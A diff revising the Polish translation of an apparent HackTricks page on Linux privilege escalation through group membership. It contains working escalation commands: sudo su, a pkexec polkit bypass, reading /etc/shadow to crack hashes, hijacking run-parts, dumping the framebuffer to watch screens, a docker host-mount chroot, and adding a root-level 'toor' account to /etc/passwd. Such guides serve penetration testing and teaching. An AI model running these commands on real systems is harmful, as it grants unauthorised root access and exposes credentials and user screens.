@@ -14,7 +14,7 @@ Inne sposoby wsparcia HackTricks:
 
 </details>
 
-## Grupy Sudo/Admin
+## Grupy Sudo/Administratorów
 
 ### **PE - Metoda 1**
 
@@ -28,7 +28,7 @@ Inne sposoby wsparcia HackTricks:
 ```
 To oznacza, że **każdy użytkownik należący do grupy sudo lub admin może wykonać cokolwiek jako sudo**.
 
-Jeśli tak jest, aby **stać się rootem, wystarczy wykonać**:
+Jeśli tak jest, aby **stać się rootem, po prostu wykonaj**:
 ```
 sudo su
 ```
@@ -38,8 +38,7 @@ Znajdź wszystkie binarne pliki suid i sprawdź, czy istnieje binarna aplikacja 
 ```bash
 find / -perm -4000 2>/dev/null
 ```
-Jeśli okaże się, że binarny **pkexec jest binarnym SUID** i należysz do grupy **sudo** lub **admin**, prawdopodobnie będziesz mógł wykonywać binarne jako sudo, używając `pkexec`.\
-Dzieje się tak, ponieważ zazwyczaj te grupy są wewnątrz **polityki polkit**. Ta polityka określa, które grupy mogą korzystać z `pkexec`. Sprawdź to za pomocą:
+Jeśli okaże się, że binarny **pkexec jest binarnym SUID** i należysz do grupy **sudo** lub **admin**, prawdopodobnie będziesz mógł wykonywać binarne jako sudo, używając `pkexec`. To dlatego, że zazwyczaj te grupy są wewnątrz **polityki polkit**. Ta polityka określa, które grupy mogą używać `pkexec`. Sprawdź to za pomocą:
 ```bash
 cat /etc/polkit-1/localauthority.conf.d/*
 ```
@@ -55,7 +54,7 @@ polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freed
 ==== AUTHENTICATION FAILED ===
 Error executing command as another user: Not authorized
 ```
-**To nie dlatego, że nie masz uprawnień, ale dlatego, że nie jesteś podłączony bez GUI**. Istnieje sposób na obejście tego problemu tutaj: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Potrzebujesz **2 różne sesje ssh**:
+**To nie dlatego, że nie masz uprawnień, ale dlatego, że nie jesteś podłączony bez GUI**. Istnieje sposób na obejście tego problemu tutaj: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Potrzebujesz **2 różnych sesji ssh**:
 
 {% code title="sesja1" %}
 ```bash
@@ -74,7 +73,7 @@ pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
 
 ## Grupa Wheel
 
-**Czasami**, **domyślnie** w pliku **/etc/sudoers** można znaleźć tę linię:
+**Czasami**, **domyślnie** w pliku **/etc/sudoers** można znaleźć tę linijkę:
 ```
 %wheel	ALL=(ALL:ALL) ALL
 ```
@@ -86,17 +85,17 @@ sudo su
 ```
 ## Grupa Shadow
 
-Użytkownicy z **grupy shadow** mogą **czytać** plik **/etc/shadow**:
+Użytkownicy z **grupy shadow** mogą **odczytywać** plik **/etc/shadow**:
 ```
 -rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
 ```
-Więc przeczytaj plik i spróbuj **złamać kilka hashy**.
+Więc, przeczytaj plik i spróbuj **złamać kilka hashy**.
 
 ## Grupa Personelu
 
-**personel**: Umożliwia użytkownikom dodawanie lokalnych modyfikacji do systemu (`/usr/local`) bez konieczności posiadania uprawnień roota (zauważ, że wykonywalne pliki w `/usr/local/bin` są w zmiennej PATH każdego użytkownika i mogą "nadpisać" wykonywalne pliki w `/bin` i `/usr/bin` o tej samej nazwie). Porównaj z grupą "adm", która bardziej dotyczy monitorowania/bezpieczeństwa. [\[źródło\]](https://wiki.debian.org/SystemGroups)
+**staff**: Umożliwia użytkownikom dodawanie lokalnych modyfikacji do systemu (`/usr/local`) bez konieczności posiadania uprawnień roota (zauważ, że pliki wykonywalne w `/usr/local/bin` są w zmiennej PATH każdego użytkownika i mogą "nadpisać" pliki wykonywalne w `/bin` i `/usr/bin` o tej samej nazwie). Porównaj z grupą "adm", która bardziej dotyczy monitorowania/bezpieczeństwa. [\[źródło\]](https://wiki.debian.org/SystemGroups)
 
-W dystrybucjach debianowych zmienna `$PATH` pokazuje, że `/usr/local/` będzie uruchamiany jako najwyższy priorytet, niezależnie od tego, czy jesteś uprzywilejowanym użytkownikiem, czy nie.
+W dystrybucjach debian, zmienna `$PATH` pokazuje, że `/usr/local/` będzie uruchamiany jako najwyższy priorytet, niezależnie od tego, czy jesteś uprzywilejowanym użytkownikiem, czy nie.
 ```bash
 $ echo $PATH
 /usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
@@ -104,9 +103,9 @@ $ echo $PATH
 # echo $PATH
 /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
 ```
-Jeśli uda nam się przejąć kontrolę nad niektórymi programami w `/usr/local`, łatwo uzyskamy uprawnienia roota.
+Jeśli uda nam się przejąć kontrolę nad niektórymi programami w `/usr/local`, możemy łatwo uzyskać uprawnienia roota.
 
-Przejęcie kontroli nad programem `run-parts` jest łatwym sposobem na uzyskanie uprawnień roota, ponieważ większość programów uruchamia program `run-parts` (np. crontab, podczas logowania przez SSH).
+Przejęcie kontroli nad programem `run-parts` jest łatwym sposobem na uzyskanie uprawnień roota, ponieważ większość programów uruchamia `run-parts` (np. crontab, podczas logowania przez ssh).
 ```bash
 $ cat /etc/crontab | grep run-parts
 17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
@@ -174,32 +173,32 @@ USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
 yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
 moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
 ```
-Grupa **tty1** oznacza, że użytkownik **yossi jest zalogowany fizycznie** do terminala na maszynie.
+**tty1** oznacza, że użytkownik **yossi jest zalogowany fizycznie** do terminala na maszynie.
 
-Grupa **video** ma dostęp do przeglądania wyjścia ekranu. W zasadzie możesz obserwować ekrany. Aby to zrobić, musisz **przechwycić bieżący obraz na ekranie** w postaci surowych danych i uzyskać rozdzielczość, którą ekran używa. Dane ekranu można zapisać w `/dev/fb0`, a rozdzielczość tego ekranu można znaleźć w `/sys/class/graphics/fb0/virtual_size`.
+Grupa **video** ma dostęp do wyświetlania danych ekranowych. W zasadzie można obserwować ekrany. Aby to zrobić, musisz **przechwycić bieżący obraz na ekranie** w postaci surowych danych i uzyskać rozdzielczość, jaką ekran używa. Dane ekranu można zapisać w `/dev/fb0`, a rozdzielczość tego ekranu można znaleźć w `/sys/class/graphics/fb0/virtual_size`.
 ```bash
 cat /dev/fb0 > /tmp/screen.raw
 cat /sys/class/graphics/fb0/virtual_size
 ```
-Aby **otworzyć** **surowy obraz**, możesz użyć **GIMP**, wybierz plik \*\*`screen.raw` \*\* i wybierz jako typ pliku **Dane obrazu surowego**:
+Aby **otworzyć** **surowy obraz**, możesz użyć **GIMP**, wybrać plik \*\*`screen.raw` \*\* i wybrać jako typ pliku **Dane obrazu surowego**:
 
-![](<../../../.gitbook/assets/image (460).png>)
+![](<../../../.gitbook/assets/image (463).png>)
 
 Następnie zmodyfikuj Szerokość i Wysokość na te używane na ekranie i sprawdź różne Typy obrazu (i wybierz ten, który najlepiej pokazuje ekran):
 
-![](<../../../.gitbook/assets/image (314).png>)
+![](<../../../.gitbook/assets/image (317).png>)
 
 ## Grupa Root
 
 Wygląda na to, że domyślnie **członkowie grupy root** mogą mieć dostęp do **modyfikacji** niektórych plików konfiguracyjnych **usługi** lub niektórych plików **bibliotek** lub **innych interesujących rzeczy**, które mogą być wykorzystane do eskalacji uprawnień...
 
-**Sprawdź, które pliki mogą być modyfikowane przez członków root**:
+**Sprawdź, które pliki członkowie root mogą modyfikować**:
 ```bash
 find / -group root -perm -g=w 2>/dev/null
 ```
 ## Grupa Docker
 
-Możesz **podłączyć system plików root hosta do woluminu instancji**, więc gdy instancja się uruchamia, natychmiast wczytuje `chroot` do tego woluminu. To efektywnie daje Ci uprawnienia roota na maszynie.
+Możesz **podłączyć system plików root hosta do woluminu instancji**, więc gdy instancja zostanie uruchomiona, natychmiast wczytuje `chroot` do tego woluminu. To efektywnie daje Ci uprawnienia roota na maszynie.
 ```bash
 docker image #Get images from the docker service
 
@@ -211,18 +210,6 @@ echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/pa
 #Ifyou just want filesystem and network access you can startthe following container:
 docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
 ```
-Ostatecznie, jeśli żadne z powyższych sugestii Ci się nie podobają lub z jakiegoś powodu nie działają (firewall api docker?), zawsze możesz spróbować **uruchomić kontener z uprawnieniami roota i uciec z niego**, jak wyjaśniono tutaj:
-
-{% content-ref url="../docker-security/" %}
-[docker-security](../docker-security/)
-{% endcontent-ref %}
-
-Jeśli masz uprawnienia do zapisu w gnieździe docker, przeczytaj [**ten post o eskalacji uprawnień poprzez nadużycie gniazda docker**](../#writable-docker-socket)**.**
-
-{% embed url="https://github.com/KrustyHack/docker-privilege-escalation" %}
-
-{% embed url="https://fosterelli.co/privilege-escalation-via-docker.html" %}
-
 ## Grupa lxc/lxd
 
 {% content-ref url="./" %}
@@ -237,18 +224,4 @@ Dlatego jeśli skompromitowałeś użytkownika należącego do tej grupy, zdecyd
 ## Grupa Auth
 
 Wewnątrz OpenBSD grupa **auth** zazwyczaj może zapisywać w folderach _**/etc/skey**_ i _**/var/db/yubikey**_ jeśli są używane.\
-Te uprawnienia mogą być nadużyte za pomocą poniższego exploitu do **eskalacji uprawnień** do roota: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
-
-<details>
-
-<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
-
-Inne sposoby wsparcia HackTricks:
-
-* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
-* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
-* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
-* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
-
-</details>
+Te uprawnienia mogą być nadużyte za pomocą następującego exploitu do **eskalacji uprawnień** do roota: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
